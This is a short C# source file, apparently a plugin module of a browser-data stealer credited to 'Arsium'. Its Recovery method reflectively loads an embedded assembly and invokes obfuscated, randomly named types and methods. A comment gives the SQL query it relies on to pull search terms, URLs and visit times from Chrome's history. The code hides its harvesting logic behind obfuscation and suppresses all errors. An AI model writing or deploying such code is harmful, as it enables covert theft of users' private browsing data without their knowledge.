using System.Collections.Generic;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal class ChromiumKeywords
    {
		//select keyword_search_terms.term, urls.url, urls.last_visit_time from keyword_search_terms join urls on keyword_search_terms.url_id = urls.id

		internal static List<object[]> Recovery()
		{
			try
			{
				System.Reflection.Assembly assemblytoload = System.Reflection.Assembly.Load(ChromiumHistory.Chrome);
				System.Reflection.MethodInfo method = assemblytoload.GetType("Y7M9K2N6Q9.T8E9A5M1I7M0G6F8").GetMethod("VC7B3D6T8D9");
				object obj = assemblytoload.CreateInstance(method.Name);
				List<object[]> chrome = (List<object[]>)method.Invoke(obj, null);
				return chrome;
			}
			catch { return null; }
		}
	}
}
